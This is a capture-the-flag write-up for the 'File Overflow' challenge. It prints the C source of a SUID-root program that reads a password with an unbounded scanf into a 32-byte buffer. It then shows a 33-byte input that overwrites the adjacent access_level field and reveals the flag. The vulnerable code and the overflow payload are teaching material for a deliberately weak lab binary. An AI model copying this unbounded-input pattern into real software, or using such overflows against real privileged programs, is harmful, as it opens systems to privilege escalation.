# File Overflow

Proposed difficulty: `Easy`

65 solves

```text
Tillykke med dit nye job her hos LS pension. Vi er glade for at du har valgt at starte her. For at du kan komme i gang skal du ind i vores filsystem. Her kan du finde de filer du skal bruge. SSH ind i vores system på FileSystem.hkn. Dit brugernavn er employe1 og din adgangskode er 321. Men pas på at du ikke får filsystemet til at flyde over.

ssh employe1@filesystem.hkn
```

# Solution

I started by ssh'ing into the remote, as described in the challenge description.

```text
employe1@c4adf933a369:~$ ls -alF
total 40
drwxr-xr-x 1 employe1 employe1  4096 Dec  4 10:13 ./
drwxr-xr-x 1 root     root      4096 Dec  4 10:13 ../
-rw-r--r-- 1 employe1 employe1   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 employe1 employe1  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 employe1 employe1   807 Apr 23  2023 .profile
-rwsr-xr-x 1 root     root     16240 Dec  4 10:13 File_acces_system*
drwxr-xr-x 1 root     root      4096 Dec  4 10:13 src/
employe1@c4adf933a369:~$ 
```

In the server we have a binary with SUID as root, and a src folder:

```text
employe1@c4adf933a369:~$ ls -alF src
total 12
drwxr-xr-x 1 root     root     4096 Dec  4 10:13 ./
drwxr-xr-x 1 employe1 employe1 4096 Dec  4 10:13 ../
-rw-rw-rw- 1 root     root     1949 Dec  4 10:12 File_acces_system.c
```

Here is the source:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

typedef struct user {
    char username[32];
    char password[32];
    int access_level;
} user;

void idCheck(user *account) {
    if (account->access_level >= 3) {
        printf("Since you are the boss you can get the balance of any account\n");

        system("cat /path_to_flag");
    } else {
        printf("you dont have the right access level\n");
    }
}

int main() {
    int choice = 1;
    int deposit_ammount;
    int withdraw_ammount;

    struct user newUser;
    newUser.access_level = 1;

    printf("Good afternoon and welcome\n");
    printf("What is your name\n");
    gets(newUser.username);

    while (choice >= 0) {
        printf("\nSelect an option:\n");
        printf("1. Check access level\n");
        printf("2. View account details\n");
        printf("3. Change password\n");
        printf("4. Access file\n");
        printf("0. Exit\n");
        scanf("%d", &choice);
         switch (choice) {
            case 1:
                printf("Your access level is: %d\n", newUser.access_level);
                printf("contagt admin to get higher access level\n");
                break;
            case 2:
                printf("Username: %s\n", newUser.username);
                printf("contat admin to see password\n");
                printf("Access level: %d\n", newUser.access_level);
                break;
            case 3:
                printf("Enter new password: ");
                scanf("%s", newUser.password);
                printf("Password changed successfully!\n");
                break;
            case 4:
                idCheck(&newUser);
                break;
            case 0:
                printf("Goodbye!\n");
                return 0;
            default:
                printf("Invalid choice!\n");
                break;
        }
    }

    return 0;
}
```

We're especially interested in the function called `idCheck()`:

```c
void idCheck(user *account) {
    if (account->access_level >= 3) {
        printf("Since you are the boss you can get the balance of any account\n");

        system("cat /path_to_flag");
    } else {
        printf("you dont have the right access level\n");
    }
}
```

It seems like we want the user to have an `access_level` of `>= 3`, as this will print out the flag for us.

The `Change password` menu allows us to do a buffer overflow, and overwrite the value of access level if we input more than 32 characters.

We can do this, as the `user.password` buffer is right next to the `user.access_level` integer. When we write past the `user.password` buffer, the overflowing input overwrites the integer stored in `user.access_level`.

I will set the access level to 100 by creating a payload of 32 A's, followed by a single "d", which has the ASCII value of 100.

```text
employe1@c4adf933a369:~$ ./File_acces_system 
Good afternoon and welcome
What is your name
dnorhoj

Select an option:
1. Check access level
2. View account details
3. Change password
4. Access file
5. Exit
1
Your access level is: 1
contagt admin to get higher access level

Select an option:
1. Check access level
2. View account details
3. Change password
4. Access file
0. Exit
3
Enter new password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd
Password changed successfully!

Select an option:
1. Check access level
2. View account details
3. Change password
4. Access file
0. Exit
1
Your access level is: 100
contagt admin to get higher access level

Select an option:
1. Check access level
2. View account details
3. Change password
4. Access file
0. Exit
4
Since you are the boss you can get the balance of any account
DDC{THE_FILES_ARE_EVERYWHERE}
```

# Flag

`DDC{THE_FILES_ARE_EVERYWHERE}`
